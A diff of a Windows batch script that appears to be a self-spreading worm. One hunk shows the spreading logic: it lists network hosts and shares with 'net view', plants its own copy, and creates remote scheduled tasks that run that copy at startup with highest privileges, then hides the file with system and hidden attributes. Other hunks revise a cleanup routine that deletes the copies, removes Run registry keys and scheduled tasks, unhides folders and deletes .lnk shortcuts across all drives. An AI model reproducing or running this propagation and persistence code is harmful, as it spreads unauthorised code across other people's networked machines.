@@ -156,7 +156,7 @@ timeout /nobreak /t 5 >nul
 
 for /f "skip=3 tokens=1,* delims= " %%i in ('net view') do if /i "%%i" NEQ "The" (
   for /f "skip=7 tokens=1,* delims= " %%j in ('net view %%i') do if /i "%%j" NEQ "The" (
-    if exist "%%i:\%~nx0" (
+    if exist "%%i\%%j\%~nx0" (
       (for /f "delims=\" %%z in ("%%i") do schtasks /create /s %%z /sc onstart /tn "%app_name% %%j" /tr %%j:\%~nx0 /f /rl highest)>nul 2>nul
       attrib +h +r +s "%%i\%%j\%~nx0"
 
@@ -205,18 +205,24 @@ del /q "%path_autoRun2%\%~nx0"
 
 
 for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do (
-  del /q "%%i:\%~nx0"
-  reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
-  reg delete HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
-  reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
-  reg delete HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
-  schtasks /delete /tn "%app_name% %%i" /f
+  if exist "%%i:\" (
+    if exist "%%i:\%~nx0" (
+      del /q "%%i:\%~nx0"
+      (
+        reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
+        reg delete HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
+        reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
+        reg delete HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /f
+        schtasks /delete /tn "%app_name% %%i" /f
+      )>nul 2>nul
 
-  if /i "%%i:" NEQ "%systemDrive%" (
-    for /f "delims=" %%x in ('dir "%%i:\*" /a:d /b 2^>nul') do (
-      if /i "%%x" NEQ "$RECYCLE.BIN" if /i "%%x" NEQ "FOUND.000" if /i "%%x" NEQ "Recycled" if /i "%%x" NEQ "System Volume Information" (
-        attrib -h -s "%%i:\%%x"
-        if exist "%%i:\%%x.lnk" del /q "%%i:\%%x.lnk"
+      if /i "%%i:" NEQ "%systemDrive%" (
+        for /f "delims=" %%x in ('dir "%%i:\*" /a:d /b 2^>nul') do (
+          if /i "%%x" NEQ "$RECYCLE.BIN" if /i "%%x" NEQ "FOUND.000" if /i "%%x" NEQ "Recycled" if /i "%%x" NEQ "System Volume Information" (
+            attrib -h -s "%%i:\%%x"
+            if exist "%%i:\%%x.lnk" del /q "%%i:\%%x.lnk"
+          )
+        )
       )
     )
   )
@@ -226,14 +232,16 @@ for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do (
 
 for /f "skip=3 tokens=1,* delims= " %%i in ('net view') do if /i "%%i" NEQ "The" (
   for /f "skip=7 tokens=1,* delims= " %%j in ('net view %%i') do if /i "%%j" NEQ "The" (
-    del /q "%%i\%%j\%~nx0"
-    for /f "delims=\" %%z in ("%%i") do schtasks /delete /s %%z /tn "%app_name% %%j" /f
+    if exist "%%i\%%j\%~nx0" (
+      del /q "%%i\%%j\%~nx0"
+      (for /f "delims=\" %%z in ("%%i") do schtasks /delete /s %%z /tn "%app_name% %%j" /f)>nul 2>nul
 
-    if /i "%%j:" NEQ "C:" (
-      for /f "delims=" %%x in ('dir "%%i\%%j\*" /a:d /b 2^>nul') do (
-        if /i "%%x" NEQ "$RECYCLE.BIN" if /i "%%x" NEQ "FOUND.000" if /i "%%x" NEQ "Recycled" if /i "%%x" NEQ "System Volume Information" (
-          attrib -h -s "%%i\%%j\%%x"
-          if exist "%%i\%%j\%%x.lnk" del /q "%%i\%%j\%%x.lnk"
+      if /i "%%j:" NEQ "C:" (
+        for /f "delims=" %%x in ('dir "%%i\%%j\*" /a:d /b 2^>nul') do (
+          if /i "%%x" NEQ "$RECYCLE.BIN" if /i "%%x" NEQ "FOUND.000" if /i "%%x" NEQ "Recycled" if /i "%%x" NEQ "System Volume Information" (
+            attrib -h -s "%%i\%%j\%%x"
+            if exist "%%i\%%j\%%x.lnk" del /q "%%i\%%j\%%x.lnk"
+          )
         )
       )
     )
